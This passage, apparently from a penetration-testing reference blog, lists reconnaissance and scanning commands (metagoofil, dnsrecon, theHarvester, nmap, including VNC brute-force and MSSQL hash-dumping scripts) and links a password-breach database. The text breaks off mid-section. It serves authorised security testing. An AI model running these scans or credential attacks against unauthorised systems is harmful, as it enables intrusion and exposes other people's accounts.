  </a>
  
    <nav class="md-nav" aria-label="DLL-Hijacking">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linkinfodll-replacement" class="md-nav__link">
    <span class="md-ellipsis">
      linkinfo.dll Replacement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-event-persistence-via-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      WMI Event Persistence via Powershell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="WMI Event Persistence via Powershell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-event-filter" class="md-nav__link">
    <span class="md-ellipsis">
      WMI Event Filter
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#event-consumer" class="md-nav__link">
    <span class="md-ellipsis">
      Event Consumer
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filterconsumer-binding" class="md-nav__link">
    <span class="md-ellipsis">
      Filter/Consumer Binding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removal" class="md-nav__link">
    <span class="md-ellipsis">
      REMOVAL
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malicious-outlook-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Malicious Outlook Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-remote-management-winrm-psremoting" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Remote Management (WinRM) / PSRemoting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uninstall-a-patch-to-leave-the-system-vulnerable" class="md-nav__link">
    <span class="md-ellipsis">
      Uninstall a patch to leave the system vulnerable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Create custom DLL for password filters and install on DC to capture changed passwords
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#application-whitelisting-bypass-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Application Whitelisting Bypass Techniques
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certutil" class="md-nav__link">
    <span class="md-ellipsis">
      Certutil
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adfind" class="md-nav__link">
    <span class="md-ellipsis">
      Adfind
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Powershell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-files-custom" class="md-nav__link">
    <span class="md-ellipsis">
      Find-Files (custom)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-enumeration-custom" class="md-nav__link">
    <span class="md-ellipsis">
      Get-Enumeration (custom)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-and-execute-iex" class="md-nav__link">
    <span class="md-ellipsis">
      Download and execute IEX
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#encodedcommand-and-iex-detection-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      EncodedCommand and IEX detection bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikittenz" class="md-nav__link">
    <span class="md-ellipsis">
      Mimikittenz
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup" class="md-nav__link">
    <span class="md-ellipsis">
      PowerUp
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" class="md-nav__link">
    <span class="md-ellipsis">
      PowerView
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PowerView">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#net-functions" class="md-nav__link">
    <span class="md-ellipsis">
      net * Functions:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-functions" class="md-nav__link">
    <span class="md-ellipsis">
      GPO functions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-hunting-functions" class="md-nav__link">
    <span class="md-ellipsis">
      User-Hunting Functions:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-trust-functions" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Trust Functions:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metafunctions" class="md-nav__link">
    <span class="md-ellipsis">
      MetaFunctions:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inveigh">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-requirements" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Requirements:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#features" class="md-nav__link">
    <span class="md-ellipsis">
      Features:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-wout-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell W/out Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-indexeditem" class="md-nav__link">
    <span class="md-ellipsis">
      Get-IndexedItem
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interacting-w-windows-api" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting w/ Windows API
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Interacting w/ Windows API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-lock-workstation-and-messagebox" class="md-nav__link">
    <span class="md-ellipsis">
      Example - Lock Workstation and MessageBox
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mailsniper-owa-and-exchange-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      MailSniper (OWA and Exchange Enumeration)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="MailSniper (OWA and Exchange Enumeration)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" class="md-nav__link">
    <span class="md-ellipsis">
      Locate OWA instances via Autodiscover using only organization primary domain name
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" class="md-nav__link">
    <span class="md-ellipsis">
      DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-start-guide" class="md-nav__link">
    <span class="md-ellipsis">
      Quick Start Guide
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-domainpasswordspray-options" class="md-nav__link">
    <span class="md-ellipsis">
      Invoke-DomainPasswordSpray Options
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misc-powershell-pasties" class="md-nav__link">
    <span class="md-ellipsis">
      Misc Powershell Pasties
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    <span class="md-ellipsis">
      Mimikatz
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoast" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberoast
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-admin-privesc-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Admin Privesc Methods
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-and-control" class="md-nav__link">
    <span class="md-ellipsis">
      Command and Control
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Command and Control">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-fronting" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Fronting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cobalt-strike" class="md-nav__link">
    <span class="md-ellipsis">
      Cobalt Strike
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Cobalt Strike">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#opsec-considerations-for-beacon-commands" class="md-nav__link">
    <span class="md-ellipsis">
      OPSEC Considerations for Beacon Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-function-wrapper" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell Function Wrapper
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Persistence Scripts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#empire" class="md-nav__link">
    <span class="md-ellipsis">
      EMPIRE
    </span>
  </a>
  
    <nav class="md-nav" aria-label="EMPIRE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c2-profiles" class="md-nav__link">
    <span class="md-ellipsis">
      C2 Profiles
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    <span class="md-ellipsis">
      Linux
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Linux">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bash" class="md-nav__link">
    <span class="md-ellipsis">
      BASH
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-persistence-ideas" class="md-nav__link">
    <span class="md-ellipsis">
      Linux Persistence Ideas
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpcclient" class="md-nav__link">
    <span class="md-ellipsis">
      rpcclient
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    <span class="md-ellipsis">
      enum4linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iptables" class="md-nav__link">
    <span class="md-ellipsis">
      iptables
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldapsearch" class="md-nav__link">
    <span class="md-ellipsis">
      ldapsearch
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nfs" class="md-nav__link">
    <span class="md-ellipsis">
      NFS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#shells" class="md-nav__link">
    <span class="md-ellipsis">
      Shells
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shells">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tty-shells" class="md-nav__link">
    <span class="md-ellipsis">
      TTY Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bind-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Bind Shells
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#reverse-shells" class="md-nav__link">
    <span class="md-ellipsis">
      Reverse Shells
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-tunnels" class="md-nav__link">
    <span class="md-ellipsis">
      SSH Tunnels
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#impacket" class="md-nav__link">
    <span class="md-ellipsis">
      Impacket
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Impacket">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#install-impacket-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Install impacket on Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#secretsdump" class="md-nav__link">
    <span class="md-ellipsis">
      Secretsdump
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#getuserspnspy" class="md-nav__link">
    <span class="md-ellipsis">
      GetUserSPNS.py
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbrelayxpy" class="md-nav__link">
    <span class="md-ellipsis">
      SMBRelayx.py
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#brute-force-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Brute Force Techniques
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      Web Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql" class="md-nav__link">
    <span class="md-ellipsis">
      SQL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sqli-examples" class="md-nav__link">
    <span class="md-ellipsis">
      SQLi Examples
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQLi Examples">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-joins" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Joins
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mysql" class="md-nav__link">
    <span class="md-ellipsis">
      MySQL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="MySQL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#udf-install-for-command-execution" class="md-nav__link">
    <span class="md-ellipsis">
      UDF Install for Command Execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlmap" class="md-nav__link">
    <span class="md-ellipsis">
      SQLMap
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#xss" class="md-nav__link">
    <span class="md-ellipsis">
      XSS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#server-side-javascript-injection-via-node-or-elementjs" class="md-nav__link">
    <span class="md-ellipsis">
      Server-side Javascript Injection via Node or ElementJS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cold-fusion" class="md-nav__link">
    <span class="md-ellipsis">
      Cold Fusion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java" class="md-nav__link">
    <span class="md-ellipsis">
      Java
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Java">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jboss" class="md-nav__link">
    <span class="md-ellipsis">
      JBOSS
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#java-deserialization" class="md-nav__link">
    <span class="md-ellipsis">
      Java Deserialization
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Java Deserialization">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jmxinvokerservlet" class="md-nav__link">
    <span class="md-ellipsis">
      JMXInvokerServlet
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php" class="md-nav__link">
    <span class="md-ellipsis">
      PHP
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PHP">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#php-type-juggling" class="md-nav__link">
    <span class="md-ellipsis">
      PHP Type Juggling
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-sockets" class="md-nav__link">
    <span class="md-ellipsis">
      Web Sockets
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      Misc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#decompiling-net-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      Decompiling .NET Binaries
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#canary-tokens" class="md-nav__link">
    <span class="md-ellipsis">
      Canary Tokens
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#python-ssl-web-server" class="md-nav__link">
    <span class="md-ellipsis">
      Python SSL Web Server
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mcafee-sitelistxml-decryption" class="md-nav__link">
    <span class="md-ellipsis">
      McAfee SiteList.xml decryption
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tightvnc-password-retrieval" class="md-nav__link">
    <span class="md-ellipsis">
      TightVNC Password Retrieval
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-lists" class="md-nav__link">
    <span class="md-ellipsis">
      Password Lists
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aix-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      AIX Passwords
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-ntlm-hash-from-mac-cli" class="md-nav__link">
    <span class="md-ellipsis">
      Create NTLM Hash from Mac CLI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hash-cracking-examples" class="md-nav__link">
    <span class="md-ellipsis">
      Hash Cracking Examples
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      Magic Hashes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


<h1 id="penetration-testing-pasties">Penetration Testing Pasties<a class="headerlink" href="#penetration-testing-pasties" title="Permanent link">&para;</a></h1>
<p><strong>James Tubberville | January 11, 2019 | Tweet This Post: <a href="https://twitter.com/intent/tweet?url=http://threatexpress.com/blogs/2019/penetration-testing-pasties/&amp;text=Penetration testing and red teaming snipits."><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg></span></a></strong></p>
<p><img alt="" src="/img/pasties.png" /></p>
<p>'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest (<a href="https://www.twitter.com/joevest">@joevest</a>), Andrew Chiles (<a href="https://www.twitter.com/andrewchiles">@andrewchiles</a>), Derek Rushing, or myself (<a href="https://www.twitter.com/minis_io">@minis_io</a>) have found useful. Over time additional sections, section placeholders, snippets, and links were added for "quick reference" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki.</p>
<p>As usual, you can find an updated version of pasties (and other tools) on GitHub: <a href="https://github.com/threatexpress">https://github.com/threatexpress</a>.</p>
<p>Penetration Testing Framework</p>
<ul>
<li><a href="http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html">http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html</a></li>
</ul>
<p>Penetration Testing Execution Standard</p>
<ul>
<li><a href="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines">http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</a></li>
</ul>
<p>Good writeup on passive information gathering</p>
<ul>
<li><a href="http://www.securitysift.com/passive-reconnaissance/">http://www.securitysift.com/passive-reconnaissance/</a></li>
</ul>
<p>Password Breach Database, requires subscription</p>
<p><a href="https://leakbase.pw/">https://leakbase.pw/</a></p>
<h3 id="foca">FOCA<a class="headerlink" href="#foca" title="Permanent link">&para;</a></h3>
<h3 id="maltego">Maltego<a class="headerlink" href="#maltego" title="Permanent link">&para;</a></h3>
<h3 id="reconng">ReconNG<a class="headerlink" href="#reconng" title="Permanent link">&para;</a></h3>
<h3 id="metagoofil">Metagoofil<a class="headerlink" href="#metagoofil" title="Permanent link">&para;</a></h3>
<p>Source: <a href="http://resources.infosecinstitute.com/kali-reporting-tools/#gref">http://resources.infosecinstitute.com/kali-reporting-tools/#gref</a></p>
<p>Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc.</p>
<p>Metagoofil performs the following:</p>
<ul>
<li>Searches the given file type using the Google search engine</li>
<li>Downloads all the documents found</li>
<li>Extracts metadata from downloaded documents</li>
<li>Saves the result in HTML file</li>
</ul>
<p>Perform document metadata searching on target domain using first 200 google results</p>
<div class="highlight"><pre><span></span><code>    metagoofil -d &lt;target&gt;.com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html
</code></pre></div>
<h3 id="censysio">censys.io<a class="headerlink" href="#censysio" title="Permanent link">&para;</a></h3>
<p>Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed.</p>
<ul>
<li>Create an account and get an API key for use in ReconNG or manual searching</li>
<li><a href="https://censys.io/ipv4?q=">https://censys.io/ipv4?q=</a></li>
</ul>
<p>Python API</p>
<div class="highlight"><pre><span></span><code>    # pip install censys

    import censys.ipv4
    c = censys.ipv4.CensysIPv4(api_id=&quot;Get from MyAccount at censys.io&quot;, api_secret=&quot;Get from MyAccount at censys.io&quot;)
    ranges=[&quot;X.X.X.0/24&quot;, &quot;X.X.X.0/24&quot;, &quot;X.X.X.0/24&quot;]
    for range in ranges:
        results = c.search(range)
        for result in results:
            for port in result[&quot;protocols&quot;]:
                print result[&quot;ip&quot;] + &quot;,&quot; + port
</code></pre></div>
<h2 id="network-scanning">Network Scanning<a class="headerlink" href="#network-scanning" title="Permanent link">&para;</a></h2>
<h3 id="dsnrecon">dsnrecon<a class="headerlink" href="#dsnrecon" title="Permanent link">&para;</a></h3>
<p>Normal dns reverse lookup of IP range with CSV output</p>
<div class="highlight"><pre><span></span><code>    dnsrecon -t rvl -r 1.2.3.4/24 -c output.csv
</code></pre></div>
<p>Perform default enumeration of a domain</p>
<div class="highlight"><pre><span></span><code>    dnsrecon -d &lt;domain&gt;
</code></pre></div>
<p>Perform zone transfer attempt</p>
<div class="highlight"><pre><span></span><code>    dnsrecon -t axfr -d &lt;domain&gt;

    ╰ $ dnsrecon -h
    Version: 0.8.10
    Usage: dnsrecon.py &lt;options&gt;

    Options:
       -h, --help                   Show this help message and exit.
       -d, --domain      &lt;domain&gt;   Target domain.
       -r, --range       &lt;range&gt;    IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
       -n, --name_server &lt;name&gt;     Domain server to use. If none is given, the SOA of the target will be used.
       -D, --dictionary  &lt;file&gt;     Dictionary file of subdomain and hostnames to use for brute force.
       -f                           Filter out of brute force domain lookup, records that resolve to the wildcard defined
                                    IP address when saving records.
       -t, --type        &lt;types&gt;    Type of enumeration to perform:
                                    std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
                                    rvl       Reverse lookup of a given CIDR or IP range.
                                    brt       Brute force domains and hosts using a given dictionary.
                                    srv       SRV records.
                                    axfr      Test all NS servers for a zone transfer.
                                    goo       Perform Google search for subdomains and hosts.
                                    snoop     Perform cache snooping against all NS servers for a given domain, testing
                                              all with file containing the domains, file given with -D option.
                                    tld       Remove the TLD of given domain and test against all TLDs registered in IANA.
                                    zonewalk  Perform a DNSSEC zone walk using NSEC records.
       -a                           Perform AXFR with standard enumeration.
       -s                           Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
       -g                           Perform Google enumeration with standard enumeration.
       -w                           Perform deep whois record analysis and reverse lookup of IP ranges found through
                                    Whois when doing a standard enumeration.
       -z                           Performs a DNSSEC zone walk with standard enumeration.
       --threads         &lt;number&gt;   Number of threads to use in reverse lookups, forward lookups, brute force and SRV
                                    record enumeration.
       --lifetime        &lt;number&gt;   Time to wait for a server to response to a query.
       --db              &lt;file&gt;     SQLite 3 file to save found records.
       --xml             &lt;file&gt;     XML file to save found records.
       --iw                         Continue brute forcing a domain even if a wildcard records are discovered.
       -c, --csv         &lt;file&gt;     Comma separated value file.
       -j, --json        &lt;file&gt;     JSON file.
       -v                           Show attempts in the brute force modes.
</code></pre></div>
<h3 id="theharvester">TheHarvester<a class="headerlink" href="#theharvester" title="Permanent link">&para;</a></h3>
<p>Perform lookup against <domain> with additional DNS reverse on all ranges discovered</p>
<div class="highlight"><pre><span></span><code>    theharvester -d &lt;domain&gt; -c -n -b google -l 1000 [-f output]

    Usage: theharvester options

           -d: Domain to search or company name
           -b: data source: google, googleCSE, bing, bingapi, pgp
                            linkedin, google-profiles, people123, jigsaw,
                            twitter, googleplus, all

           -s: Start in result number X (default: 0)
           -v: Verify host name via dns resolution and search for virtual hosts
           -f: Save the results into an HTML and XML file
           -n: Perform a DNS reverse query on all ranges discovered
           -c: Perform a DNS brute force for the domain name
           -t: Perform a DNS TLD expansion discovery
           -e: Use this DNS server
           -l: Limit the number of results to work with(bing goes from 50 to 50 results,
           -h: use SHODAN database to query discovered hosts
                google 100 to 100, and pgp doesn&#39;t use this option)

    Examples:
            theharvester -d microsoft.com -l 500 -b google
            theharvester -d microsoft.com -b pgp
            theharvester -d microsoft -l 200 -b linkedin
            theharvester -d apple.com -b googleCSE -l 500 -s 300
</code></pre></div>
<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt">https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt</a></p>
<p>Host discovery
<code>nmap -sn -n &lt;targets&gt;
        nmap -A &lt;host&gt; (run this second)
        nmap -sV -F
        nmap -p- -sV -O -T4 -v7 -sC</code></p>
<p>Open SMB shares
<code>nmap --script=smb-enum-shares -p445</code></p>
<p>Open NFS Shares
<code>nmap -p 111,2049 --script nfs-ls,nfs-showmount</code></p>
<p>UDP scan:
<code>nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5 &lt;targets&gt;</code></p>
<p>Anonymous FTP
<code>nmap -sC -sV -p21
        nmap -sV -n -sS -Pn-vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 &lt;targets&gt;</code></p>
<p>VNC Brute
<code>nmap --script=vnc-brute -p5800,5900</code></p>
<p>Rawr Scan
<code>nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web</code></p>
<p>MSSQL Scan
<code>nmap -vv-sV -Pn-n -p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa &lt;targets&gt; -oA &lt;outfile&gt;</code></p>
<p>HTTP Scan
<code>nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt &lt;targets&gt; -oA &lt;outfile&gt;</code></p>
